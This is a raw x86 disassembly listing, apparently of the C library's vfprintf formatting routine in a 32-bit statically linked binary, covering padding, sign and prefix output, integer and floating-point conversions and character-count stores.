mov dword [var_8h_2], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [var_578h]
test edi, edi
je 0x8064620
mov dword [esp], esi
call fcn.08051180
jmp 0x8064620
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], ebx
jmp 0x8064620
mov ebx, eax
mov eax, dword [var_494h]
sub ebx, esi
and eax, 7
sub ebx, eax
jmp 0x80650bc
mov eax, dword [var_568h]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08076f30
mov ebx, eax
jmp 0x80650be
mov eax, dword [0x80a9ab4]
jmp 0x8065035
mov dword [esp], esi
call fcn.08053400
jmp 0x80651c8
mov eax, dword [var_568h]
mov dword [var_4a4h], esi
mov dword [var_4a0h], 0
lea edi, [var_4a0h]
mov dword [var_49ch], 0
test eax, eax
js 0x8065298
cmp dword [var_568h], 0x1000
ja 0x8065262
mov eax, dword [var_568h]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_sp_ch], edi
lea eax, [var_4a4h]
mov edx, dword [var_568h]
mov dword [var_4h_2], eax
mov dword [esp], esi
mov dword [var_8h_2], edx
call fcn.08077e00
mov ebx, eax
cmp ebx, 0xffffffff
jne 0x80650be
jmp 0x8064cc0
mov esi, dword [var_568h]
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806521d
mov eax, dword [var_568h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_578h], 1
jmp 0x8065232
lea ecx, [var_4a4h]
mov dword [var_sp_ch], edi
mov dword [var_8h_2], 0
mov dword [var_4h_2], ecx
mov dword [esp], 0
call fcn.08077e00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064cc0
mov eax, dword [var_4a0h]
test eax, eax
jne 0x806534a
mov dword [var_4a4h], esi
lea esi, [ebx + 1]
cmp esi, 0x1000
mov dword [var_57ch], esi
ja 0x806531a
lea eax, [ebx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_sp_ch], edi
lea ecx, [var_4a4h]
mov edx, dword [var_57ch]
mov dword [var_4h_2], ecx
mov dword [esp], esi
mov dword [var_8h_2], edx
call fcn.08077e00
jmp 0x8065254
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80652e6
mov eax, dword [var_57ch]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_578h], 1
jmp 0x80652f5
mov dword [var_sp_ch], str._IO_vfprintf
mov dword [var_8h_2], 0x703
mov dword [var_4h_2], str.vfprintf.c
mov dword [esp], str.__mbstate_____count__0_
call fcn.0805efc0
cmp dword [var_568h], 0xffffffff
je 0x8065380
cmp dword [var_568h], 5
jle 0x806538f
mov esi, 0x80a0a40
mov ebx, 6
jmp 0x80650be
mov esi, 0x80a4f11
xor ebx, ebx
jmp 0x80650be
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806542f
mov eax, dword [var_554h]
test eax, eax
jne 0x8065415
mov eax, dword [var_55ch]
test eax, eax
jne 0x80653fe
mov edi, dword [var_558h]
test edi, edi
je 0x80653e8
mov eax, dword [arg_10h]
mov edx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], dx
jmp 0x8064620
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x8064620
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
movzx edx, byte [var_4b0h]
mov byte [eax], dl
jmp 0x8064620
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_4b0h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x8064620
mov esi, dword [var_554h]
test esi, esi
jne 0x80654af
mov ebx, dword [var_55ch]
test ebx, ebx
jne 0x8065494
mov ecx, dword [var_558h]
test ecx, ecx
je 0x8065471
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov edi, dword [var_4b0h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov word [eax], di
jmp 0x8064620
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov edi, dword [var_4b0h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov dword [eax], edi
jmp 0x8064620
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x8065407
mov esi, dword [var_51ch]
mov edi, dword [var_524h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [edi + eax*4]
jmp 0x806541e
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065a75
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x8065a52
mov edi, 0x10
xor ebx, ebx
mov dword [var_53ch], eax
mov dword [var_540h], 1
mov dword [var_550h], 0
mov byte [var_56eh], 0x78
cmp dword [var_568h], 0
jl 0x8065a43
mov byte [var_56dh], 0x20
jne 0x80659b2
mov eax, dword [var_53ch]
test eax, eax
jne 0x80659b2
cmp edi, 8
mov esi, dword [var_4bch]
je 0x806599b
mov eax, dword [var_4bch]
sub eax, esi
cmp dword [var_568h], eax
jg 0x8065583
mov eax, dword [var_53ch]
test eax, eax
je 0x8065583
mov eax, dword [var_540h]
test eax, eax
je 0x8065583
cmp edi, 8
je 0x8065992
mov edx, dword [var_4bch]
mov eax, 0
mov ecx, dword [var_548h]
sub edx, esi
sub dword [var_568h], edx
cmovns eax, dword [var_568h]
test ecx, ecx
mov dword [var_568h], eax
jne 0x80657d2
lea eax, [eax + edx]
sub dword [var_564h], eax
mov eax, dword [var_53ch]
test eax, eax
je 0x80655e7
mov ecx, dword [var_540h]
test ecx, ecx
je 0x80655e7
mov eax, dword [var_564h]
sub eax, 2
cmp edi, 0x10
cmovne eax, dword [var_564h]
mov dword [var_564h], eax
test ebx, ebx
jne 0x80655ff
mov edx, dword [var_54ch]
test edx, edx
jne 0x80655ff
mov eax, dword [var_544h]
test eax, eax
je 0x8065605
dec dword [var_564h]
cmp byte [var_56dh], 0x20
je 0x8065796
test ebx, ebx
je 0x8065744
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065728
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
mov eax, dword [var_53ch]
test eax, eax
je 0x8065651
mov eax, dword [var_540h]
test eax, eax
je 0x8065651
cmp edi, 0x10
je 0x80656b6
mov eax, dword [var_568h]
add dword [var_564h], eax
mov edi, dword [var_564h]
test edi, edi
jle 0x806568a
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x30
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov ebx, dword [var_4bch]
mov eax, dword [edi + 0x94]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h_2], ebx
mov dword [var_4h_2], esi
call dword [eax + 0x1c]
cmp eax, ebx
je 0x806461a
jmp 0x8064cc0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8065710
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_56eh]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x80656ff
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
jmp 0x8065651
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x80656ed
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80656ca
jmp 0x8064cc0
mov dword [var_4h_2], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x8065632
jmp 0x8064cc0
mov eax, dword [var_54ch]
test eax, eax
je 0x806576b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065761
mov byte [eax], 0x2b
jmp 0x806562c
mov dword [var_4h_2], 0x2b
jmp 0x8065730
mov eax, dword [var_544h]
test eax, eax
je 0x8065638
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806578c
mov byte [eax], 0x20
jmp 0x806562c
mov dword [var_4h_2], 0x20
jmp 0x8065730
mov eax, dword [var_564h]
test eax, eax
jle 0x80657c3
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov dword [var_564h], 0
jmp 0x8065612
test ebx, ebx
je 0x8065940
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806591e
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
dec dword [var_564h]
mov edx, dword [var_53ch]
test edx, edx
je 0x806581b
mov eax, dword [var_540h]
test eax, eax
je 0x806581b
cmp edi, 0x10
je 0x80658a5
mov ebx, dword [var_4bch]
mov edx, dword [var_568h]
sub ebx, esi
lea eax, [edx + ebx]
sub dword [var_564h], eax
test edx, edx
jle 0x8065853
mov dword [var_8h_2], edx
mov dword [var_4h_2], 0x30
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], eax
mov eax, dword [var_564h]
test eax, eax
jle 0x8064620
mov eax, dword [var_564h]
mov dword [esp], edi
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
call fcn.08075680
jmp 0x806461a
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8065906
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_56eh]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x80658f5
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
sub dword [var_564h], 2
jmp 0x806581b
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x80658dc
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80658b9
jmp 0x8064cc0
mov dword [var_4h_2], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x80657f2
jmp 0x8064cc0
lea esi, [esi]
mov ebx, dword [var_54ch]
test ebx, ebx
je 0x8065967
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806595d
mov byte [eax], 0x2b
jmp 0x80657ec
mov dword [var_4h_2], 0x2b
jmp 0x8065926
mov ecx, dword [var_544h]
test ecx, ecx
je 0x80657fe
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065988
mov byte [eax], 0x20
jmp 0x80657ec
mov dword [var_4h_2], 0x20
jmp 0x8065926
dec esi
mov byte [esi], 0x30
jmp 0x8065583
mov eax, dword [var_540h]
test eax, eax
je 0x8065556
dec esi
mov byte [esi], 0x30
jmp 0x8065556
xor eax, eax
cmp byte [var_56eh], 0x58
mov dword [var_8h_2], edi
sete al
mov dword [var_sp_ch], eax
mov eax, dword [var_4bch]
mov dword [var_4h_2], eax
mov edx, dword [var_53ch]
mov dword [esp], edx
call fcn.08063c00
mov ecx, dword [var_550h]
mov esi, eax
test ecx, ecx
je 0x8065a13
mov edx, dword [var_4ach]
test edx, edx
je 0x8065a13
mov ecx, dword [var_4a8h]
mov dword [esp], ecx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_56ch]
test eax, eax
je 0x8065556
cmp edi, 0xa
jne 0x8065556
mov eax, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08063f40
mov esi, eax
jmp 0x8065556
mov dword [var_568h], 1
jmp 0x80659b2
cmp dword [var_568h], 4
mov eax, 5
mov esi, 0x80a0a39
cmovg eax, dword [var_568h]
mov dword [var_568h], eax
jmp 0x8064fd8
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x80654ef
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ab6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x8064fe2
mov ecx, dword [var_51ch]
mov edi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
jmp 0x8064fe2
mov edx, dword [var_560h]
test edx, edx
jne case.0x80648b6.57
mov eax, dword [var_548h]
dec dword [var_564h]
test eax, eax
jne 0x8065b1c
mov eax, dword [var_564h]
test eax, eax
jle 0x8065b1c
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov esi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [esi + esi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ba8
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x14]
cmp edx, dword [edi + 0x18]
jae 0x8065b97
mov byte [edx], al
mov edx, dword [arg_8h]
inc dword [edx + 0x14]
inc eax
je 0x8064cc0
mov eax, dword [var_548h]
inc dword [var_4b0h]
test eax, eax
je 0x8064620
mov eax, dword [var_564h]
test eax, eax
jle 0x8064620
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
jmp 0x806589b
movzx eax, al
mov dword [esp], edi
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x8065b51
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [esi + eax*4]
jmp 0x8065b3e
mov edx, dword [var_4c4h]
lea eax, [edx + edx*2]
mov edx, dword [var_51ch]
shl eax, 4
add edx, eax
jne 0x8065d31
lea ebx, [var_43ch]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_568h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_56eh]
mov ecx, dword [var_564h]
mov dword [var_43ch], edx
mov dword [var_438h], ecx
movzx ecx, byte [var_554h]
mov dword [var_434h], eax
movzx eax, byte [var_558h]
and ecx, 1
and eax, 1
add eax, eax
movzx edx, byte [var_430h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_560h]
or edx, eax
movzx eax, byte [var_540h]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_544h]
or edx, eax
movzx eax, byte [var_548h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_550h]
or edx, eax
movzx eax, byte [var_54ch]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movzx eax, byte [var_42fh]
or edx, ecx
mov byte [var_430h], dl
movzx edx, byte [var_56ch]
and eax, 0xfffffff7
and edx, 1
shl edx, 3
or eax, edx
mov byte [var_42fh], al
movsx eax, byte [var_56dh]
mov dword [var_42ch], eax
mov eax, dword [var_554h]
test eax, eax
je 0x8065d20
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_480h], eax
mov dword [var_4h_2], ebx
lea eax, [var_480h]
mov dword [var_8h_2], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08067f60
jmp 0x8064612
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8065cf6
mov edi, dword [var_51ch]
mov ecx, dword [var_524h]
mov eax, dword [edi + eax + 0x24]
lea eax, [eax + eax*2]
lea eax, [ecx + eax*4]
mov dword [var_480h], eax
mov dword [var_4h_2], edx
jmp 0x8065d06
mov edi, 0x10
mov esi, dword [var_554h]
xor ebx, ebx
mov dword [var_54ch], 0
mov dword [var_544h], 0
test esi, esi
je 0x8065ed5
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065eb6
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_53ch], edx
mov dword [var_538h], ecx
cmp dword [var_568h], 0
jl 0x8065ea7
mov byte [var_56dh], 0x20
jne 0x8065e0c
mov esi, dword [var_538h]
or esi, dword [var_53ch]
jne 0x8065e0c
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8065dfc
mov edx, dword [var_53ch]
or edx, dword [var_538h]
setne al
movzx eax, al
mov dword [var_53ch], eax
jmp 0x8065556
mov ecx, dword [var_540h]
test ecx, ecx
je 0x8065ddf
dec esi
mov byte [esi], 0x30
jmp 0x8065ddf
xor eax, eax
cmp byte [var_56eh], 0x58
mov dword [var_sp_ch], edi
sete al
mov dword [var_10h], eax
mov eax, dword [var_4bch]
mov dword [var_8h_2], eax
mov ecx, dword [var_538h]
mov edx, dword [var_53ch]
mov dword [var_4h_2], ecx
mov dword [esp], edx
call fcn.08063ca0
mov edx, dword [var_550h]
mov esi, eax
test edx, edx
je 0x8065e77
mov ecx, dword [var_4ach]
test ecx, ecx
je 0x8065e77
mov ecx, dword [var_4a8h]
mov dword [esp], ecx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov edx, dword [var_56ch]
test edx, edx
je 0x8065ddf
cmp edi, 0xa
jne 0x8065ddf
mov eax, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08063f40
mov esi, eax
jmp 0x8065ddf
mov dword [var_568h], 1
jmp 0x8065e0c
mov ecx, dword [var_51ch]
mov eax, dword [ecx + edx + 0x24]
mov ecx, dword [var_524h]
lea eax, [eax + eax*2]
mov edx, dword [ecx + eax*4]
mov ecx, dword [ecx + eax*4 + 4]
jmp 0x8065da4
mov ecx, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065f2d
mov eax, dword [var_55ch]
test eax, eax
je 0x8065f0c
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_53ch], eax
jmp 0x806551f
mov eax, dword [var_558h]
test eax, eax
jne 0x8065f21
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x8065f01
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x8065f01
mov eax, dword [var_55ch]
test eax, eax
je 0x8065f50
mov esi, dword [var_51ch]
mov eax, dword [esi + edx + 0x24]
mov edx, dword [var_524h]
lea eax, [eax + eax*2]
movzx eax, byte [edx + eax*4]
jmp 0x8065f01
mov eax, dword [var_558h]
test eax, eax
jne 0x8065f72
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x8065f01
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, word [esi + eax*4]
jmp 0x8065f01
mov edi, 8
jmp 0x8065d58
mov edi, 0xa
jmp 0x8065d58
mov eax, dword [var_554h]
mov edi, 0xa
test eax, eax
je 0x8066010
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ff4
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov ebx, edx
shr ebx, 0x1f
je 0x8065fe3
neg eax
adc edx, 0
neg edx
mov dword [var_53ch], eax
mov dword [var_538h], edx
jmp 0x8065db0
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4 + 4]
mov eax, dword [esi + eax*4]
jmp 0x8065fd5
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8066048
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [eax]
mov eax, edx
mov ebx, edx
neg eax
shr ebx, 0x1f
cmovne edx, eax
mov dword [var_53ch], edx
jmp 0x806551f
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4]
jmp 0x8066031
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806607f
mov byte [eax], 0x25
mov edi, dword [arg_8h]
inc dword [edi + 0x14]
inc dword [var_4b0h]
jmp 0x8064620
mov dword [var_4h_2], 0x25
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8066074
jmp 0x8064cc0
lea ebx, [var_43ch]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
movzx edx, byte [var_4f0h]
rep stosd dword es:[edi], eax
mov eax, dword [var_4fch]
movzx ecx, byte [var_4f4h]
mov edi, dword [var_500h]
add edx, edx
mov dword [var_438h], eax
movsx eax, byte [var_506h]
shl ecx, 2
mov dword [var_43ch], edi
mov dword [var_434h], eax
movzx eax, byte [var_430h]
and eax, 0xfffffffc
or eax, dword [var_4ech]
or eax, edx
movzx edx, byte [var_4d8h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_4dch]
shl edx, 3
or eax, edx
movzx edx, byte [var_4e0h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_4e4h]
shl edx, 5
or eax, edx
movzx edx, byte [var_4e8h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
shl edx, 7
or eax, edx
mov byte [var_430h], al
movzx eax, byte [var_505h]
mov dword [var_42ch], eax
mov eax, dword [var_4ech]
test eax, eax
je 0x8066253
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_458h], eax
mov dword [var_4h], ebx
lea eax, [var_458h]
mov dword [var_8h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0806a140
test eax, eax
js 0x8064cc0
lea esi, [esi]
add dword [var_4b0h], eax
mov eax, dword [var_4b8h]
inc dword [var_4c4h]
test eax, eax
jne 0x8066240
lea ecx, [var_444h]
mov dword [var_4h], ecx
mov ebx, dword [var_44ch]
inc ebx
mov dword [var_44ch], ebx
mov dword [esp], ebx
call fcn.08074610
mov esi, dword [arg_8h]
mov dword [var_44ch], eax
mov edx, eax
sub edx, ebx
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
call dword [eax + 0x1c]
mov edx, dword [var_44ch]
mov ecx, eax
mov eax, edx
sub eax, ebx
cmp ecx, eax
jne 0x806622a
add dword [var_4b0h], ecx
cmp byte [edx], 0
jne 0x80642f7
jmp 0x80642a6
mov dword [var_4b0h], 0xffffffff
jmp 0x80642a6
lea esi, [esi]
mov edx, dword [var_4b8h]
mov dword [esp], edx
call fcn.08051180
jmp 0x80661c6
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x806617c
mov eax, 0
mov edi, esp
test eax, eax
je 0x8066374
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_45ch], 0
mov dword [var_460h], 0
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_460h]
mov dword [var_8h], eax
lea esi, [var_23h_2]
mov eax, dword [arg_10h]
and esi, 0xfffffff0
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08077b00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064f80
sub dword [var_4fch], eax
mov eax, dword [var_4e0h]
test eax, eax
jne 0x8066311
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066311
mov edx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064f80
mov eax, dword [var_4e0h]
add dword [var_4b0h], ebx
test eax, eax
je 0x806636d
mov eax, dword [var_4fch]
test eax, eax
jle 0x806636d
mov ecx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08075680
add dword [var_4b0h], eax
mov esp, edi
jmp 0x80661b6
mov eax, dword [0x80a9ab4]
jmp 0x8066282
lea eax, [var_3fch]
mov dword [var_8h], 0x3e8
mov dword [var_4h], eax
mov esi, dword [var_4c8h]
mov dword [esp], esi
call fcn.08053300
mov esi, eax
mov dword [var_4f4h], 0
test esi, esi
mov dword [var_50ch], 0
je 0x8066727
mov edi, dword [var_4f4h]
test edi, edi
jne 0x80665ab
cmp byte [var_506h], 0x53
je 0x80665ab
cmp dword [var_500h], 0xffffffff
je 0x80665a1
mov eax, 0
test eax, eax
je 0x8066597
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp dword [eax + 0x58], 1
je 0x806657e
mov edx, dword [var_500h]
mov edi, esp
mov dword [var_46ch], esi
mov dword [var_468h], 0
mov dword [var_464h], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea eax, [var_468h]
mov dword [var_10h_2], eax
lea edx, [var_23h_2]
lea eax, [var_46ch]
mov ecx, dword [var_500h]
and edx, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], edx
mov dword [esp + 0xc], ecx
mov dword [var_8h], ecx
call fcn.08078100
inc eax
je 0x8064f80
mov eax, dword [var_46ch]
test eax, eax
jne 0x806656a
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
mov esp, edi
sub dword [var_4fch], ebx
js 0x8066540
mov edx, dword [var_4e0h]
test edx, edx
jne 0x80664c9
mov eax, dword [var_4fch]
test eax, eax
jle 0x80664c9
mov eax, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
mov eax, dword [var_4e0h]
add dword [var_4b0h], ebx
test eax, eax
je 0x8066525
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066525
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov eax, dword [var_50ch]
test eax, eax
je 0x80661b6
mov dword [esp], esi
call fcn.08051180
jmp 0x80661b6
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], ebx
jmp 0x80661b6
